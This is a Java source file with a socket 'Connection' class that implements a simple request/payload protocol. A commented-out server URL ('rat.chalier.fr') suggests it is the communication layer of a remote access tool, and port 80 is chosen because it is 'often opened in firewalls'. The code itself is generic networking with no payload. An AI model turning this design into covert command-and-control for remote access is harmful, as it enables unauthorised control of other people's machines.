package tools;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;

/**
 * Beholds a socket and its in and out streams.
 * Manages the communication protocol.
 * 
 * There are two write options, either a single line
 * or a request attached with a payload (raw data, as a byte array).
 * 
 * Thus there are two read options, one for a single line
 * and one for a request / payload scheme.
 * 
 * All requests end with an EOR byte sequence.
 * 
 * @author Yohan Chalier
 *
 */
public class Connection {
	
	/**
	 * Server url.
	 * Using a domain name to be able to change IP once compiled.
	 */
	// private static final String SERVER_URL = "http://rat.chalier.fr";
	private static final String SERVER_URL = "127.0.0.1";
	
	/**
	 * Server port. 80 by default, as often opened in firewalls.
	 */
	private static final int SERVER_PORT = 80;
	
	/**
	 * Newline byte sequence.
	 */
	private static final byte[] CRLF = new byte[] {13, 10};
	
	/**
	 * End of request byte sequence.
	 */
	private static final byte[] EOR = new byte[] {0, 1, 2};
	
	private Socket socket;
	private InputStream in;
	private OutputStream out;
	
	public Connection()
			throws UnknownHostException, IOException {
		this(SERVER_URL, SERVER_PORT);
	}
	
	public Connection(String url, int port)
			throws UnknownHostException, IOException {
		this(new Socket(url, port));
	}
	
	public Connection(Socket socket)
			throws IOException {
		this.socket = socket;
		out = socket.getOutputStream();
		in = socket.getInputStream();
	}
	
	/**
	 * Write a request and a payload to the outputstream
	 * of the socket. Syntax is:
	 * [PAYLOAD LENGTH]\r\n
	 * REQUEST\r\n
	 * PAYLOAD [End of request]
	 * 
	 * @param request The request to send
	 * @param payload The payload to send, raw data (byte array)
	 */
	public void write(String request, byte[] payload) {
		try {
			out.write(Integer.toString(payload.length).getBytes());
			out.write(CRLF);
			out.write(request.getBytes());
			out.write(CRLF);
			out.write(payload);
			out.write(EOR);
			out.flush(); // Force buffered output bytes to be written out
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	/**
	 * Write a single line to the outputstream of the socket.
	 * 
	 * @param response The line to write
	 */
	public void write(String response) {
		try {
			out.write(response.getBytes());
			out.write(EOR);
			out.flush(); // Force buffered output bytes to be written out
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	/**
	 * Reads the input stream until it finds the CRLF sequence.
	 * Blocks until there is something to read in the input stream,
	 * and this something contains a CRLF sequence.
	 * 
	 * @return The concatenation of encountered characters.
	 */
	private String readLine() {
		StringBuilder sb = new StringBuilder();
		int c;
		
		try {
			// Loops until the \n character is encountered
			while ((c = in.read()) != CRLF[CRLF.length - 1]) {
				sb.append((char) c);
			}
			// Replacing the last CRLF.length - 1 characters,
			// as they are of no interest, only markers.
			sb.replace(sb.length() - CRLF.length + 1, sb.length(), "");
			
		} catch (IOException e) {
			e.printStackTrace();
		}

		return sb.toString();
	}
	
	/**
	 * Reads the input stream for a request (payload length, request and
	 * payload). Blocks until there is something to read.
	 * 
	 * @return The parsed command containing read information
	 */
	public ParsedCommand readRequest() {
		try {
			// Payload length
			int payloadLength = Integer.parseInt(readLine());
			String request = readLine();
			
			// Reading payload
			byte[] payload = new byte[payloadLength];
			for (int i = 0; i < payloadLength; i++)
				payload[i] = (byte) in.read();
			
			// Moving cursor, as we added an EOR at the end of write()
			for (int i = 0; i < EOR.length; i++)
				in.read();
			
			return new ParsedCommand(request, payload);
			
		} catch (IOException e) {
			e.printStackTrace();
		}
		return null;
	}
	
	/**
	 * Reads the input stream for a sequence of characters until
	 * an EOR is encountered. Blocks until there is something to read in
	 * the input stream.
	 * 
	 * @return
	 */
	public String readResponse() {
		try {
			// Buffered of the last read bytes
			byte[] lastBytes = new byte[EOR.length];
			boolean isEOC;
			
			StringBuilder response = new StringBuilder();
			int c;
			while (true) {
				c = in.read();
				
				// Stream is closed
				if (c == -1)
					return response.toString();
				
				// Determining if end of request
				isEOC = true;
				// This loop both shifts the buffer sequence and
				// checks for a EOR correspondence.
				for (int i = 1; i < lastBytes.length; i++) {
					lastBytes[i-1] = lastBytes[i];
					isEOC = isEOC && lastBytes[i-1] == EOR[i - 1]; 
				}
				
				// Adding and checking the new read character
				lastBytes[lastBytes.length - 1] = (byte) c;
				isEOC = isEOC && (byte) c == EOR[EOR.length - 1];
				
				if (isEOC) {
					// Removing last EOR.length - 1 characters
					response.replace(response.length() - EOR.length + 1,
							response.length(), "");
					break;
				} else {
					response.append((char) c);
				}
			}
			return response.toString();
			
		} catch (IOException e) {
			e.printStackTrace();
		}
		return null;
	}
	
	/**
	 * Returns the InetAddress of the socket.
	 * Used for authentification.
	 * 
	 * @return The InetAddress of the incoming user.
	 */
	public InetAddress getInetAddress() {
		return socket.getInetAddress();
	}
	
	/**
	 * Closes the connection.
	 * 
	 * @throws IOException
	 */
	public void close() throws IOException {
		in.close();
		out.close();
		socket.close();
	}
	
}
